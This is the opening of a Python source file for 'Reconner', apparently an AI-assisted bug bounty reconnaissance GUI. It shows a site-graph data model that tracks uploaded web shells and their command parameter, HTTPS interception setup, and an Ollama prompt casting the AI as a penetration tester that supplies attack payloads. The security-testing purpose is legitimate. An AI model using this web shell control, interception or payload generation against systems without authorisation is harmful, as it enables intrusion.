#!/usr/bin/env python3
"""
Reconner - AI-powered bug bounty reconnaissance tool
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import threading
from concurrent.futures import ThreadPoolExecutor
import json
import hashlib
import base64
import math
import os
import time
from datetime import datetime
from collections import deque, defaultdict
import itertools
import random
import html as _html
from pathlib import Path
import re
import warnings
import webbrowser
import socketserver
import tempfile
import queue
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote


# ── Hide hidden (dot-prefixed) files/dirs in every Tk file dialog ──────────
# Tk's file dialog reads a global var to decide whether to list dot-files. Set
# it off (and drop the reveal toggle) before each dialog so loaders — the
# Fuzzer wordlist picker, graph open/save, PNG export, … — never expose
# ~/.ssh, ~/.zshrc and friends. Wrapping the filedialog entry points applies
# this to every call site, present and future, from one place.
def _suppress_hidden_in_dialogs():
    root = getattr(tk, '_default_root', None)
    if root is None:
        return
    try:
        # Force Tk to source its file-dialog implementation so the namespace
        # vars exist (the bogus option raises TclError after sourcing it).
        root.tk.call('tk_getOpenFile', '-invalidoption')
    except tk.TclError:
        pass
    for _var, _val in (('::tk::dialog::file::showHiddenVar', '0'),
                       ('::tk::dialog::file::showHiddenBtn', '0')):
        try:
            root.tk.call('set', _var, _val)
        except tk.TclError:
            pass


def _no_hidden(_fn):
    def _wrapped(*args, **kwargs):
        _suppress_hidden_in_dialogs()
        return _fn(*args, **kwargs)
    return _wrapped


for _fd_name in ('askopenfilename', 'askopenfilenames',
                 'asksaveasfilename', 'askdirectory'):
    _fd_orig = getattr(filedialog, _fd_name, None)
    if _fd_orig is not None:
        setattr(filedialog, _fd_name, _no_hidden(_fd_orig))


try:
    import networkx as nx
    NX_AVAILABLE = True
except ImportError:
    NX_AVAILABLE = False

try:
    import matplotlib
    matplotlib.use('TkAgg')
    import numpy as np
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches
    from matplotlib.collections import LineCollection
    from matplotlib.offsetbox import OffsetImage, AnnotationBbox
    from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
    MPL_AVAILABLE = True
except ImportError:
    MPL_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.firefox.options import Options as FirefoxOptions
    from selenium.webdriver.firefox.service import Service as FirefoxService
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.common.exceptions import WebDriverException, TimeoutException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# Certificate authority + per-host leaf certs for the HTTPS interceptor. Without
# `cryptography` the proxy can still relay plain HTTP and tunnel HTTPS blindly,
# but it can't decrypt/intercept TLS (no MITM certs).
try:
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from datetime import timedelta, timezone
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    import ollama as ollama_lib
    OLLAMA_AVAILABLE = True
except ImportError:
    OLLAMA_AVAILABLE = False

# Optional fingerprinting helpers — used by fingerprint_target(). Each one is
# probed independently and silently skipped when missing.
import socket
import ssl
import subprocess
import shutil

try:
    # Wappalyzer's bundled apps.json carries a few malformed regexes; it
    # warns once per pattern at compile time (Wappalyzer.py _prepare_pattern).
    # The per-call catch_warnings() in _fp_probe_wappalyzer is unreliable here
    # because fingerprint probes run as parallel jobs and catch_warnings mutates
    # process-global state (not thread-safe), so install a process-global filter
    # that survives the threaded job runner regardless of timing.
    warnings.filterwarnings(
        'ignore', message=r'Caught .* compiling regex', module=r'Wappalyzer\..*')
    from Wappalyzer import Wappalyzer, WebPage
    WAPPALYZER_AVAILABLE = True
except Exception:
    WAPPALYZER_AVAILABLE = False

try:
    import dns.resolver
    DNS_AVAILABLE = True
except Exception:
    DNS_AVAILABLE = False

try:
    import whois as whois_lib
    WHOIS_AVAILABLE = True
except Exception:
    WHOIS_AVAILABLE = False

# ─────────────────────────────────────────────
# Chicago 95 palette
# ─────────────────────────────────────────────
C = {
    'bg':           '#c0c0c0',
    'bg_dark':      '#808080',
    'highlight':    '#ffffff',
    'shadow':       '#808080',
    'dark_shadow':  '#404040',
    'title_bg':     '#000080',
    'title_fg':     '#ffffff',
    'btn':          '#c0c0c0',
    'black':        '#000000',
    'window':       '#ffffff',
    'sel_bg':       '#000080',
    'sel_fg':       '#ffffff',
    'graph_bg':     '#ffffff',
    'edge':         '#999999',
    'node_page':     '#4a9eff',
    'node_file':     '#ffd700',
    'node_redirect': '#b71c1c',
    'node_script':   '#e67e22',
    'node_api':      '#9b59b6',
    'node_shell':    '#2e7d32',
    'node_sel':      '#ff6b35',
    'ok':           '#2e7d32',
    'err':          '#b71c1c',
    'font':         ('MS Sans Serif', 8),
    'font_b':       ('MS Sans Serif', 8, 'bold'),
    'mono':         ('Courier', 9),
}


# ─────────────────────────────────────────────
# Settings persistence
# ─────────────────────────────────────────────
SETTINGS_DIR  = Path.home() / '.reconner'
SETTINGS_FILE = SETTINGS_DIR / 'settings.json'

DEFAULT_SETTINGS = {
    'ollama_host':      'http://localhost:11434',
    'model':            'reconner-ai',
    'wizard_model':     'wizard-ai',      # conversational model for the Wizard
    'temperature':      0.7,
    'font_size':        8,
    'icon_resolution':  'Low',        # graph node-icon detail: High/Medium/Low
    'window_geometry':  '',
    'browser_geometry': '',
    # Safe-path whitelist (allowlist). When enabled, the crawler only auto-sends
    # state-changing (non-GET) requests — probing endpoints and recovering their
    # parameters — to URLs whose path matches one of these globs; passive GET
    # navigation and label-filtered control clicks still happen everywhere.
    # Destructive paths (delete/exec/logout/upload/credential ops) are ALWAYS
    # withheld for manual testing, even if matched. One glob per line; '#'
    # comments and blank lines are ignored. Defaults below (read/query verbs).
    'whitelist_enabled': True,
    'whitelist_paths':   '',          # empty → DEFAULT_SAFE_PATHS is used
    # Max number of browser instances the crawler runs at once: the primary
    # crawl plus this many concurrent subdomain crawls. Higher = faster, more
    # RAM/CPU. Set in Settings ▸ Performance.
    'max_concurrent_browsers': 5,
    # Max number of fingerprint (Tech Scan) jobs running at once. Subdomain
    # discovery is unbounded, so this pool throttles the per-host HTTP/nmap/
    # whatweb probes. Independent of the browser limit. Set in Settings ▸ Performance.
    'max_fingerprint_workers': 8,
    # Local listen port for the intercepting proxy (Settings ▸ Proxy).
    'proxy_port': 8080,
}

# Default safe-path whitelist: read/query endpoints the crawler may auto-probe
# (any method) and recover parameters for. Derived from the read-verb heuristic;
# shown in Settings ▸ Performance so the user can edit them. Destructive paths are
# always withheld regardless of these. Substring globs (token-precise vetoing is
# handled separately), so a broad read match is safe.
DEFAULT_SAFE_PATHS = (
    "# Default safe-path whitelist — read/query endpoints the crawler auto-probes\n"
    "# (any method) and recovers parameters for. Destructive paths (delete, exec,\n"
    "# logout, upload, credential ops, …) are withheld for manual testing UNLESS\n"
    "# you list the EXACT path (no '*') to deliberately opt in. Edit freely: one\n"
    "# glob per line (* = wildcard), '#' starts a comment.\n"
    "*search*\n*query*\n*list*\n*get*\n*fetch*\n*find*\n*filter*\n*page*\n"
    "*paginate*\n*detail*\n*info*\n*view*\n*show*\n*read*\n*count*\n*status*\n"
    "*lookup*\n*preview*\n*report*\n*stat*\n*summary*\n*tree*\n*available*\n"
    "*options*\n"
)








# ─────────────────────────────────────────────
# Data model
# ─────────────────────────────────────────────
class SiteNode:
    """A single discovered URL and everything captured about it; one vertex of a
    site-structure graph.

    Attributes:
        url: The node's absolute URL — its identity in the graph.
        node_type: Category driving icon/colour and filtering: 'page', 'dir',
            'file', 'script', 'endpoint', 'redirect', 'param' or 'shell'.
        shell_name: For a 'shell' node, the uploaded web-shell path/filename
            (e.g. 'shell.jpg'), resolved against the node URL to build the
            shell's request URL.
        shell_param: For a 'shell' node, the query parameter the shell reads the
            command from (e.g. 'cmd').
        shell_method: HTTP method the shell expects the command on ('GET' or
            'POST'); the Web Shell terminal sends the command accordingly.
        parent_url: URL this node was discovered from (defines the graph edge).
        title: The page's <title>, when it is an HTML page.
        status_code: HTTP status of the response that produced the node.
        content_type: Response Content-Type, used to refine node_type.
        raw_html: Full rendered HTML of the page, when applicable.
        text_content: Visible text extracted from the page.
        get_params: Query-string parameter map.
        post_params: Body parameter map.
        links: In-scope URLs linked from this node.
        forms: Forms on the page, each as {action, method, inputs}.
        headers: Response headers of the node.
        ai_insight: Cached AI analysis text for the node.
        ai_running: True while an AI analysis is in flight (kept across views).
        scanned: True once the node has been fully processed.
        req_method, req_url, req_headers, req_body: The request that produced
            this node — its "data in".
        resp_status, resp_reason, resp_headers, resp_body: The response that
            produced this node.
        out_requests: Requests this node was seen to make in live traffic — its
            "data out"; each is {method, url, params, via}, with no response.
        edited: True for nodes the user created via the Repeater/Fuzzer; drawn
            with a small pencil overlay on the icon.
        probe_state: How the node's status was determined, so the map can tell
            apart facts that a bare status_code conflates:
              'ok'     — an HTTP response was received (status_code is real),
              'error'  — the request never completed (DNS/connect/timeout);
                         status_code is None and error_reason holds why,
              'unsent' — an unsafe method (POST/PUT/…) observed in traffic that
                         we deliberately did not replay; status_code is None.
        error_reason: Transport-error detail when probe_state == 'error'.
        locale_variants: Other locale codes the same endpoint was seen under
            (e.g. ['pt', 'ar', 'ar-MA']); set when locale-variant siblings are
            collapsed into this one representative node during a scan.
    """

    def __init__(self, url, node_type='page', parent_url=None):
        """Create a node for `url` with all capture fields empty; see the class
        docstring for what each attribute holds."""
        self.url = url
        self.node_type = node_type
        self.parent_url = parent_url
        self.title = ''
        self.status_code = None
        self.content_type = ''
        self.raw_html = ''
        self.text_content = ''
        self.get_params: dict = {}
        self.post_params: dict = {}
        self.links: list = []
        self.forms: list = []
        self.headers: dict = {}
        self.ai_insight = ''
        self.ai_running = False
        self.scanned = False
        self.req_method  = ''
        self.req_url     = ''
        self.req_headers: dict = {}
        self.req_body    = ''
        self.resp_status = None
        self.resp_reason = ''
        self.resp_headers: dict = {}
        self.resp_body   = ''
        self.out_requests: list = []
        self.edited = False
        self.probe_state = 'ok'
        self.error_reason = ''
        self.locale_variants: list = []
        self.shell_name = ''
        self.shell_param = ''
        self.shell_method = 'GET'

    def label(self):
        """A short, graph-friendly label for the node: the last segment of the
        URL path (or of an SPA hash route), with a trimmed query suffix, capped
        to 32 characters."""
        p = urlparse(self.url)
        if p.fragment.startswith(('/', '!')):
            name = p.fragment.lstrip('!').rstrip('/').rsplit('/', 1)[-1]
        else:
            name = (p.path or '/').rstrip('/').rsplit('/', 1)[-1]
        if not name:
            name = p.netloc or '/'
        if p.query:
            name += '?' + p.query[:20]
        return name if len(name) <= 32 else '…' + name[-29:]

    def to_dict(self) -> dict:
        """Serialise the node to a plain dict for JSON export; mirrors
        from_dict()."""
        return {
            'url':          self.url,
            'node_type':    self.node_type,
            'parent_url':   self.parent_url,
            'title':        self.title,
            'status_code':  self.status_code,
            'content_type': self.content_type,
            'get_params':   self.get_params,
            'post_params':  self.post_params,
            'links':        self.links,
            'forms':        self.forms,
            'headers':      self.headers,
            'ai_insight':   self.ai_insight,
            'text_content': self.text_content,
            'request': {
                'method':  self.req_method,
                'url':     self.req_url,
                'headers': self.req_headers,
                'body':    self.req_body,
            },
            'out_requests': self.out_requests,
            'response': {
                'status':  self.resp_status,
                'reason':  self.resp_reason,
                'headers': self.resp_headers,
                'body':    self.resp_body,
            },
            'raw_html':     self.raw_html,
            'scanned':      self.scanned,
            'edited':       self.edited,
            'probe_state':  self.probe_state,
            'error_reason': self.error_reason,
            'locale_variants': self.locale_variants,
            'shell_name':   self.shell_name,
            'shell_param':  self.shell_param,
            'shell_method': self.shell_method,
        }

    @classmethod
    def from_dict(cls, d: dict) -> 'SiteNode':
        """Reconstruct a SiteNode from a to_dict() payload (used to load a saved
        scan JSON back into the graph). Tolerant of missing keys so older exports
        still load."""
        # 'api' was the former name of the 'endpoint' node type — normalise it so
        # older saved scans keep their colour/icon/filter after the rename.
        nt = d.get('node_type', 'page') or 'page'
        if nt == 'api':
            nt = 'endpoint'
        node = cls(d.get('url', '') or '', nt, d.get('parent_url'))
        node.title        = d.get('title', '') or ''
        node.status_code  = d.get('status_code')
        node.content_type = d.get('content_type', '') or ''
        node.get_params   = d.get('get_params') or {}
        node.post_params  = d.get('post_params') or {}
        node.links        = d.get('links') or []
        node.forms        = d.get('forms') or []
        node.headers      = d.get('headers') or {}
        node.ai_insight   = d.get('ai_insight', '') or ''
        node.text_content = d.get('text_content', '') or ''
        node.raw_html     = d.get('raw_html', node.text_content) or ''
        req = d.get('request') or {}
        node.req_method   = req.get('method', '') or ''
        node.req_url      = req.get('url', '') or ''
        node.req_headers  = req.get('headers') or {}
        node.req_body     = req.get('body', '') or ''
        node.out_requests = d.get('out_requests') or []
        resp = d.get('response') or {}
        node.resp_status  = resp.get('status')
        node.resp_reason  = resp.get('reason', '') or ''
        node.resp_headers = resp.get('headers') or {}
        node.resp_body    = resp.get('body', '') or ''
        node.scanned      = bool(d.get('scanned', True))
        node.edited       = bool(d.get('edited', False))
        # Older exports predate probe_state: infer it so loaded graphs still
        # distinguish failures — a missing status means the probe never landed.
        node.probe_state  = d.get('probe_state') or (
            'ok' if node.status_code is not None else 'error')
        node.error_reason = d.get('error_reason', '') or ''
        node.locale_variants = d.get('locale_variants') or []
        node.shell_name  = d.get('shell_name', '') or ''
        node.shell_param = d.get('shell_param', '') or ''
        node.shell_method = (d.get('shell_method') or 'GET').upper()
        return node


# ─────────────────────────────────────────────
# Chicago 95 widgets
# ─────────────────────────────────────────────
def _titlebar(parent, text):
    """Build a Windows-9x blue title bar holding `text` and return the frame."""
    f = tk.Frame(parent, bg=C['title_bg'])
    tk.Label(f, text=' ' + text, bg=C['title_bg'], fg=C['title_fg'],
             font=C['font_b'], pady=3, padx=2).pack(side='left')
    return f


def _panel(parent, title='', **kw):
    """Build a ridged panel frame, optionally topped with a `title` title bar."""
    f = tk.Frame(parent, bg=C['bg'], relief='ridge', bd=2, **kw)
    if title:
        _titlebar(f, title).pack(fill='x')
    return f


# Fixed character width of the 'Subdomains:' menubuttons (graph panel + Tech Scan
# popup) so they never resize with a long host name — the name is truncated with
# a leading ellipsis instead.
SUBDOMAIN_BTN_W = 30


def _subdomain_btn_text(host):
    """Label for a 'Subdomains:' menubutton: 'Subdomains: <host> ▾' with the host
    truncated (leading …) to fit the fixed button width."""
    if not host:
        return 'Subdomains ▾'
    budget = max(6, SUBDOMAIN_BTN_W - len('Subdomains:  ▾'))
    short = host if len(host) <= budget else '…' + host[-(budget - 1):]
    return f'Subdomains: {short} ▾'


class Btn(tk.Button):
    """A push button styled like a Windows-9x raised button, sinking on press."""
    def __init__(self, parent, **kw):
        """Apply the Chicago-95 button defaults (overridable via **kw) and bind
        the press/release relief change."""
        kw.setdefault('bg', C['btn'])
        kw.setdefault('fg', C['black'])
        kw.setdefault('relief', 'raised')
        kw.setdefault('bd', 2)
        kw.setdefault('font', C['font'])
        kw.setdefault('cursor', 'hand2')
        kw.setdefault('padx', 6)
        kw.setdefault('pady', 2)
        kw.setdefault('highlightthickness', 0)
        super().__init__(parent, **kw)
        # Sink on press / rise on release — but never animate while disabled (a
        # blocked button shouldn't react to clicks at all).
        self.bind('<ButtonPress-1>',
                  lambda e: None if str(self['state']) == 'disabled'
                  else self.config(relief='sunken'))
        self.bind('<ButtonRelease-1>',
                  lambda e: None if str(self['state']) == 'disabled'
                  else self.config(relief='raised'))


class ToggleSwitch(tk.Canvas):
    """A horizontal slide switch: a gray-framed track that reads RED when OFF
    and GREEN when ON, with a raised knob that slides left↔right as it toggles.
    Backed by a BooleanVar and an optional `command` fired on each toggle."""
    def __init__(self, parent, variable=None, command=None,
                 width=46, height=22, **kw):
        """Build the switch sized `width`×`height`, reflecting `variable`."""
        super().__init__(parent, width=width, height=height, bg=C['bg'],
                         highlightthickness=0, bd=0, cursor='hand2', **kw)
        self.var = variable if variable is not None else tk.BooleanVar(value=False)
        self.command = command
        # NB: not self._w / self._h — tkinter uses self._w for the widget path.
        self._sw, self._sh = width, height
        self._pos = 1.0 if self.var.get() else 0.0   # knob position 0..1
        self._anim = None
        self.bind('<Button-1>', self._toggle)
        self.var.trace_add('write', lambda *_: self._animate_to(
            1.0 if self.var.get() else 0.0))
        self._draw()

    def _toggle(self, _e=None):
        """Flip the bound variable (the trace drives the slide) and notify."""
        self.var.set(not self.var.get())
        if self.command:
            self.command()

    def _animate_to(self, target):
        """Slide the knob toward `target` (0=off, 1=on) over a few frames."""
        if self._anim is not None:
            try:
                self.after_cancel(self._anim)
            except Exception:
                pass
            self._anim = None

        def step():
            """One animation frame: ease the knob toward the target position."""
            if not self.winfo_exists():
                return
            self._pos += (target - self._pos) * 0.4
            if abs(target - self._pos) < 0.02:
                self._pos = target
                self._draw()
                self._anim = None
                return
            self._draw()
            self._anim = self.after(15, step)

        step()

    def _draw(self):
        """Redraw the track (red/green by state) and the knob at its position."""
        self.delete('all')
        on = self.var.get()
        pad, w, h = 2, self._sw, self._sh
        # Track: a sunken gray frame filled red (off) / green (on).
        self.create_rectangle(pad, pad, w - pad, h - pad,
                              fill=('#2e7d32' if on else '#b71c1c'),
                              outline='#404040', width=1)
        self.create_line(pad, pad, w - pad, pad, fill='#000000')
        self.create_line(pad, pad, pad, h - pad, fill='#000000')
        # Knob: a raised silver handle sliding between the two ends.
        kw = h - 2 * pad - 2
        lo, hi = pad + 1, w - pad - 1 - kw
        kx = lo + (hi - lo) * self._pos
        self.create_rectangle(kx, pad + 1, kx + kw, h - pad - 1,
                              fill='#c0c0c0', outline='#000000', width=1)
        self.create_line(kx, pad + 1, kx + kw, pad + 1, fill='#ffffff')
        self.create_line(kx, pad + 1, kx, h - pad - 1, fill='#ffffff')


class Entry95(tk.Entry):
    """A single-line text entry styled with the sunken Chicago-95 look."""
    def __init__(self, parent, **kw):
        """Apply the Chicago-95 entry defaults, overridable via **kw."""
        kw.setdefault('bg', C['window'])
        kw.setdefault('fg', C['black'])
        kw.setdefault('insertbackground', C['black'])
        kw.setdefault('relief', 'sunken')
        kw.setdefault('bd', 2)
        kw.setdefault('font', C['font'])
        kw.setdefault('highlightthickness', 0)
        super().__init__(parent, **kw)


class Text95(tk.Text):
    """A read-only-but-selectable multi-line text box in the Chicago-95 style;
    edits, paste and cut are blocked while copy/select/navigation are allowed."""
    def __init__(self, parent, **kw):
        """Apply the styling defaults and install the read-only key/paste/cut
        bindings."""
        kw.setdefault('bg', C['window'])
        kw.setdefault('fg', C['black'])
        kw.setdefault('insertbackground', C['black'])
        kw.setdefault('relief', 'sunken')
        kw.setdefault('bd', 2)
        kw.setdefault('font', C['mono'])
        kw.setdefault('wrap', 'none')
        kw.setdefault('highlightthickness', 0)
        super().__init__(parent, **kw)
        self.bind('<Key>', self._block_edit)
        self.bind('<<Paste>>', lambda e: 'break')
        self.bind('<<Cut>>',   lambda e: 'break')
        self.bind('<Button-2>', lambda e: 'break')

    @staticmethod
    def _block_edit(ev):
        """Swallow editing keystrokes while letting copy (Ctrl-C/A/Insert) and
        cursor-navigation keys through, keeping the widget read-only."""
        ctrl = (ev.state & 0x4) != 0
        if ctrl and ev.keysym.lower() in ('c', 'a', 'insert'):
            return
        if ev.keysym in (
            'Left', 'Right', 'Up', 'Down', 'Home', 'End', 'Prior', 'Next',
            'Shift_L', 'Shift_R', 'Control_L', 'Control_R', 'Alt_L', 'Alt_R'):
            return
        return 'break'

    def set_content(self, text, *_):
        """Replace the entire contents with `text`."""
        self.delete('1.0', 'end')
        self.insert('1.0', text)


class EditText95(tk.Text):
    """Editable counterpart to Text95 (same styling, no read-only binding)."""
    def __init__(self, parent, **kw):
        """Apply the Chicago-95 text styling defaults (with undo enabled)."""
        kw.setdefault('bg', C['window'])
        kw.setdefault('fg', C['black'])
        kw.setdefault('insertbackground', C['black'])
        kw.setdefault('relief', 'sunken')
        kw.setdefault('bd', 2)
        kw.setdefault('font', C['mono'])
        kw.setdefault('wrap', 'none')
        kw.setdefault('undo', True)
        kw.setdefault('highlightthickness', 0)
        super().__init__(parent, **kw)

    def set_content(self, text, *_):
        """Replace the entire contents with `text`."""
        self.delete('1.0', 'end')
        self.insert('1.0', text)


class Chicago95Progress(tk.Frame):
    """Classic Win9x-style marquee: a cluster of green blocks sliding across a
    sunken white box. Animation only — start()/stop()/reset()."""
    GREEN = '#2e7d32'

    def __init__(self, parent, width=150, height=16, **kw):
        """Build the sunken canvas and the marquee block geometry."""
        super().__init__(parent, bg=C['bg'], **kw)
        self.width, self.height = width, height
        self.cv = tk.Canvas(self, width=width, height=height, bg=C['window'],
                            relief='sunken', bd=2, highlightthickness=0)
        self.cv.pack()
        self.block_w, self.gap = 8, 3
        self.block_h = max(6, height - 6)
        self._anim = None
        self._offset = 0

    def _tick(self):
        """Redraw one animation frame and schedule the next."""
        self.cv.delete('all')
        step = self.block_w + self.gap
        cluster = 5
        span = self.width + cluster * step
        head = self._offset % span
        y0 = (self.height - self.block_h) / 2
        y1 = y0 + self.block_h
        for i in range(cluster):
            x = head - i * step
            x0, x1 = max(2, x), min(self.width - 2, x + self.block_w)
            if x1 > x0:
                self.cv.create_rectangle(x0, y0, x1, y1,
                                         fill=self.GREEN, outline=self.GREEN)
        self._offset += step
        self._anim = self.after(70, self._tick)

    def start(self):
        """Begin (or restart) the marquee animation from the left."""
        self.stop()
        self._offset = 0
        self._tick()

    def stop(self):
        """Halt the animation, cancelling the pending redraw."""
        if self._anim is not None:
            self.after_cancel(self._anim)
            self._anim = None

    def reset(self):
        """Stop the animation and clear the canvas."""
        self.stop()
        self.cv.delete('all')


class StatusBox(tk.Frame):
    """Small square box that shows a green check (success) or red X (failure)."""
    GREEN = '#2e7d32'
    RED   = '#b71c1c'

    def __init__(self, parent, size=18, **kw):
        """Build the small sunken canvas the check/X is drawn on."""
        super().__init__(parent, bg=C['bg'], **kw)
        self.size = size
        self.cv = tk.Canvas(self, width=size, height=size, bg=C['window'],
                            relief='sunken', bd=2, highlightthickness=0)
        self.cv.pack()

    def clear(self):
        """Erase the indicator."""
        self.cv.delete('all')

    def success(self):
        """Draw a green check mark."""
        self.cv.delete('all')
        s = self.size
        self.cv.create_line(s * 0.22, s * 0.52, s * 0.42, s * 0.74, s * 0.80, s * 0.24,
                            fill=self.GREEN, width=3, capstyle='round', joinstyle='round')

    def fail(self):
        """Draw a red X."""
        self.cv.delete('all')
        s = self.size
        self.cv.create_line(s * 0.26, s * 0.26, s * 0.74, s * 0.74,
                            fill=self.RED, width=3, capstyle='round')
        self.cv.create_line(s * 0.74, s * 0.26, s * 0.26, s * 0.74,
                            fill=self.RED, width=3, capstyle='round')


class ModalToplevel(tk.Toplevel):
    """Toplevel that locks input to itself and visibly nags the user back
    into the popup whenever focus tries to escape.

    - `grab_set()` prevents interaction with any other window in the same
      application until the popup is destroyed. Combined with `transient`,
      most WMs will also keep the popup on top of its parent.
    - When focus leaves the popup entirely (e.g. the user clicks another
      OS-level window), the popup flashes: rings the bell, lifts itself
      back above siblings, and re-grabs the keyboard focus.
    - Focus moving *between widgets inside the popup* is ignored so typing
      in entries / text widgets doesn't trigger a flash."""

    def __init__(self, parent, **kw):
        """Make the window transient to `parent` and arm the modal grab and the
        focus-flash binding. The grab is deferred on a short timer so the
        subclass __init__ can finish laying out and sizing itself first
        (wait_visibility() here can wedge the dialog before it ever maps)."""
        super().__init__(parent, **kw)
        self._modal_suspended = False
        try:
            self.transient(parent)
        except tk.TclError:
            pass
        self.after(120, self._enable_modal)
        self.bind('<FocusOut>', self._flash_if_outside, add='+')

    def run_child_dialog(self, fn, *args, **kw):
        """Run a native sub-dialog (file picker / messagebox) without the modal
        grab and focus-flash stealing it back. While the dialog is open the
        grab is released and the flash is suppressed; both are restored after.
        `parent=self` is injected so the sub-dialog stacks over this window."""
        self._modal_suspended = True
        try:
            self.grab_release()
        except tk.TclError:
            pass
        kw.setdefault('parent', self)
        try:
            return fn(*args, **kw)
        finally:
            self._modal_suspended = False
            self._enable_modal()

    def _enable_modal(self):
        """Grab input to this window and force keyboard focus onto it (best
        effort — silently tolerates a window that has already gone away)."""
        if not self.winfo_exists() or self._modal_suspended:
            return
        try:
            self.grab_set()
        except tk.TclError:
            pass
        try:
            self.focus_force()
        except tk.TclError:
            pass

    def _flash_if_outside(self, event=None):
        """On the dialog losing focus to another OS window, ring the bell, lift,
        and re-grab focus. Focus moving between the dialog's own child widgets is
        ignored so normal typing doesn't trigger a flash."""
        if self._modal_suspended:
            return
        if event is not None and getattr(event, 'widget', None) is not self:
            return
        try:
            cur = self.focus_displayof()
        except (KeyError, tk.TclError):
            cur = None
        if cur is not None:
            cur_path = str(cur)
            self_path = str(self)
            if cur_path == self_path or cur_path.startswith(self_path + '.'):
                return
        try:
            self.bell()
        except tk.TclError:
            pass
        try:
            self.lift()
        except tk.TclError:
            pass
        self.after(50, self._enable_modal)




# ─────────────────────────────────────────────
# AI client
# ─────────────────────────────────────────────
SYSTEM_PROMPT = (
    "You are Reconner-AI, an elite penetration tester and bug bounty hunter. "
    "Analyze web reconnaissance data and provide actionable security findings. "
    "Identify: XSS, SQLi, IDOR, SSRF, open redirects, LFI/RFI, auth bypasses, "
    "info disclosure, misconfigurations, interesting parameters and endpoints. "
    "Be concise. Prioritize high-impact findings. Give specific payloads when relevant."
)


class ollama:
    """Ollama client: holds the model/host/temperature config and makes the
    chat requests, returning the model's text output. (Named per the project's
    class scheme; the underlying ollama library is imported as `ollama_lib`.)"""
    def __init__(self, model='reconner-ai', host='', temperature=0.7):
        """Store the model name, Ollama host (empty = library default), and
        sampling temperature."""
        self.model = model
        self.host = host
        self.temperature = temperature

    def _client(self):
        """The Ollama client to use: a host-bound Client when a host is
        configured, otherwise the module-level default."""
        if self.host:
            return ollama_lib.Client(host=self.host)
        return ollama_lib

    def analyze_node(self, node: SiteNode) -> str:
        """Ask the model for a security analysis of a single node and return its
        text. Returns a bracketed message instead if Ollama is unavailable or
        the request errors."""
        if not OLLAMA_AVAILABLE:
            return '[Ollama not installed: pip install ollama]'
        prompt = (
            f"Analyze this endpoint for security vulnerabilities:\n\n"
            f"URL: {node.url}\n"
            f"Type: {node.node_type}\n"
            f"Status: {node_status_label(node)}\n"
            f"Content-Type: {node.content_type}\n"
            f"Title: {node.title}\n"
            f"GET params: {json.dumps(node.get_params) if node.get_params else 'none'}\n"
            f"Forms: {json.dumps(node.forms) if node.forms else 'none'}\n"
            f"Links: {len(node.links)} found\n"
            f"Headers: {json.dumps(dict(list(node.headers.items())[:8]))}\n\n"
            f"Page snippet:\n{node.text_content[:600]}\n\n"
            "List vulnerabilities, test cases, and payloads."
        )
        try:
            r = self._client().chat(model=self.model, messages=[
                {'role': 'system', 'content': SYSTEM_PROMPT},
                {'role': 'user',   'content': prompt},
            ], options={'temperature': self.temperature})
            return r['message']['content']
        except Exception as e:
            return f'[AI error: {e}]'

    def analyze_fingerprint(self, fingerprint_text: str) -> str:
        """Ask the model to summarise a technology fingerprint and suggest
        next steps, returning its text (or a bracketed error/unavailable note)."""
        if not OLLAMA_AVAILABLE:
            return '[Ollama not installed: pip install ollama]'
        prompt = (
            "Below is a technology fingerprint of a target site. Summarise the "
            "tech stack (server, language, framework, libraries, CMS, CDN, API "
            "style), call out classes of vulnerabilities and common "
            "misconfigurations associated with each detected technology, and "
            "suggest next reconnaissance steps.\n\n"
            f"{fingerprint_text[:8000]}"
        )
        try:
            r = self._client().chat(model=self.model, messages=[
                {'role': 'system', 'content': SYSTEM_PROMPT},
                {'role': 'user',   'content': prompt},
            ], options={'temperature': self.temperature})
            return r['message']['content']
        except Exception as e:
            return f'[AI error: {e}]'

    def chat_stream(self, messages, model=None, on_token=None,
                    is_cancelled=None):
        """Stream a multi-turn chat completion (used by the Wizard assistant).
        `messages` is the conversation so far (the model's baked-in SYSTEM prompt
        supplies the persona). `on_token(chunk)` is called per streamed chunk on
        the CALLING thread; `is_cancelled()` (optional) lets the caller stop the
        stream early. Returns the full text, or a bracketed error string (also
        delivered through on_token) on failure / unavailability."""
        if not OLLAMA_AVAILABLE:
            msg = '[Ollama not installed: pip install ollama]'
            if on_token:
                on_token(msg)
            return msg
        mdl = model or self.model
        parts = []
        try:
            for ev in self._client().chat(
                    model=mdl, messages=messages, stream=True,
                    options={'temperature': self.temperature}):
                if is_cancelled and is_cancelled():
                    break
                chunk = (ev.get('message') or {}).get('content', '') \
                    if isinstance(ev, dict) else getattr(
                        getattr(ev, 'message', None), 'content', '')
                if chunk:
                    parts.append(chunk)
                    if on_token:
                        on_token(chunk)
            return ''.join(parts)
        except Exception as e:
            err = f'[AI error: {e}]'
            if on_token:
                on_token(err)
            return ''.join(parts) + err


# ─────────────────────────────────────────────
# Technology fingerprint
# ─────────────────────────────────────────────
_FP_UA = ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
          '(KHTML, like Gecko) Chrome/120.0 Safari/537.36')

# ── Fingerprint corpus ────────────────────────────────────────────────
# The detection signatures (ports, probe paths, and the framework / CMS /
# language / server / cookie / header tables) are *data*, not logic. They live
# here as the built-in default and are materialised to an editable JSON file
# (reconner_fingerprints.json, next to the script — override with the
# RECONNER_FP_DB env var) on first run. A user file is merged OVER these
# defaults, so the corpus can be extended for not-yet-seen technologies without
# touching the code, while a missing/corrupt file always falls back safely.
#
# Table formats:
